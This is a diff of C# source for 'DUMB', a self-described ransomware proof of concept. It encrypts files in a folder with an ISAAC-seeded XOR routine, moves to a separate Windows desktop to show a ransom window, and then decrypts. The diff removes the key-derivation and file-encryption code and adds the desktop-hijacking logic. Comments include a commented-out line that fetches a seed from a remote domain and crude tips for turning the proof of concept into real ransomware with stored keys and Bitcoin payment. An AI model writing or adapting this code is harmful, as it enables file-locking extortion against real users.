@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -10,60 +11,60 @@ namespace DUMB
 {
     static class Program
     {
-        public const string PASSPHRASE = "I will not use this for bad purposes";
-        public const int TUMBLE = 3; //Tumble ISAAC this many times before and after injecting the seed
-        public const int BUFFER_SIZE = 512;
-
+        public static string folder = null;
         [STAThread]
         static void Main()
         {
-            Stopwatch s = new Stopwatch();
-            s.Start();
-            if (!HackTheGibson()) return; //Check if we need to crypt all the files
-            s.Stop();
+            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            folder = docs + @"\TEST\";
 
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Main main = new Main(s);
-            Application.Run(main);
-
-            if (!main.denounced) MessageBox.Show("Incorrect passphrase", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            else
+            if (!Directory.Exists(folder))
             {
-                HackTheGibson(true); //Decrypt it this time
+                MessageBox.Show("Put a folder in My Documents called 'TEST' and chuck any files you want to get fucked up in there and next time read the god damn README", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
 
-                MessageBox.Show("Your files have been decrypted", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            IntPtr hOldDesktop = WinAPI.GetThreadDesktop(WinAPI.GetCurrentThreadId());
+
+            IntPtr hNewDesktop = WinAPI.CreateDesktop("DUMB",
+            IntPtr.Zero, IntPtr.Zero, 0, (uint)WinAPI.DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
+
+            IntPtr hProc = IntPtr.Zero;
+            try
+            {
+                WinAPI.SwitchDesktop(hNewDesktop);
+                bool workdone = false;
+                BackgroundWorker bg = new BackgroundWorker();
+                bg.DoWork += delegate
+                {
+                    WinAPI.SetThreadDesktop(hNewDesktop);
+                    try
+                    {
+                        Application.EnableVisualStyles();
+                        Application.SetCompatibleTextRenderingDefault(false);
+                        Application.Run(new CryptWindow(false)); //Encrypt, you wouldn't actually do this in a ransomware, this is purely for the PoC
+                        Application.Run(new Main()); //Ransom window
+                        Application.Run(new CryptWindow(true)); //Decrypt
+                    }
+                    finally { workdone = true; }
+                };
+                bg.RunWorkerAsync();
+
+                while (!workdone)
+                    System.Threading.Thread.Sleep(100);
+            }
+            catch { }
+            finally
+            {
+                WinAPI.SwitchDesktop(hOldDesktop);
+                WinAPI.CloseDesktop(hNewDesktop);
             }
         }
 
-        static ISAAC PassTheKeysBro() //Remember kids, never drink and program (unless you're developing on Windows ME, in which case it is fully justified)
+        static void HackTheGibson(bool decrypt = false)
         {
-            string seed;
-            //using (System.Net.WebClient w = new WebClient()) seed = w.DownloadString("http://someshittydomain.info/?getseed=" + Environment.MachineName);
-            seed = Environment.MachineName; //Don't do this if you feel like being a 12 year old skid and actually try and infect people with this, use randomly generated keys and store them in a MySQL database and add some Bitcoin logic to it you fat lumpy bitch-knuckles.
-
-            byte[] realseed = Encoding.UTF8/*Is the machine name stored in UTF8 or ASCII?*/.GetBytes(seed);
-
-            ISAAC csprng = new ISAAC();
-
-            for (int i = 0; i < TUMBLE; i++)
-                csprng.Isaac(); //Why not?
-
-            for (int i = 0; i < realseed.Length; i++)
-                csprng.mem[i] = realseed[i]; //Inject the seed into Isaac
-
-            seed = null; realseed = null; //Push out of scope for GC
-
-            for (int i = 0; i < TUMBLE; i++)
-                csprng.Isaac(); //Some more tumbling
-
-            return csprng;
-        }
-
-        static bool HackTheGibson(bool decrypt = false)
-        {
-            /* Grab the location for MyDocs (+ \TEST\ because this is a PoC), iterate files and crypt them*/
-            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            //Grab the location for MyDocs (+ \TEST\ because this is a PoC), iterate files and crypt them
+            /*string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
             string folder = docs + @"\TEST\";
 
@@ -75,7 +76,7 @@ namespace DUMB
 
             if (!decrypt && File.Exists(folder + "crypted")) return true; //There's no way to know if the files are actually crypted or not, so we'll use a file
 
-            /* Generate the key */
+            //Generate the key
             ISAAC csprng = PassTheKeysBro();
 
             string[] files = Directory.GetFiles(folder); //I'm not actually sure if foreach would execute this on each enumeration, I'll assume it does
@@ -91,40 +92,7 @@ namespace DUMB
             for (int i = 0; i < ISAAC.SIZE; i++)
                 csprng.mem[i] = 0; //Zero out ISAAC so it's not in the memory
 
-            return true;
-        }
-
-        //If you're wondering why I don't just make a static ISAAC, programming it this way makes it easier to skid and I can push it out of scope for the GC and zero it and whatever
-        static void CryptFile(ISAAC csprng, string loc) //XOR works both ways, so we don't need one function for Encrypting and one function for Decrypting, they're both the same thing for XORing
-        {
-            FileStream s = null;
-            try
-            {
-                s = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
-
-                byte[] buffer = new byte[ISAAC.SIZE];
-                int read = s.Read(buffer, 0, ISAAC.SIZE);
-                do
-                {
-                    csprng.Isaac();
-
-                    for (int i = 0; i < read; i++)
-                        buffer[i] = (byte)((buffer[i] ^ csprng.mem[i]) % 256);
-
-                    s.Seek(-read, SeekOrigin.Current);
-                    s.Write(buffer, 0, read);
-                } while ((read = s.Read(buffer, 0, ISAAC.SIZE)) > 0);
-            }
-            catch (UnauthorizedAccessException) { return; } //Fixes crashes on files with the readonly attribute
-            //catch { return; } //If you were to actually use this silently
-            finally
-            {
-                if (s != null)
-                {
-                    s.Close();
-                    s.Dispose();
-                }
-            }
+            return true;*/
         }
     }
 }
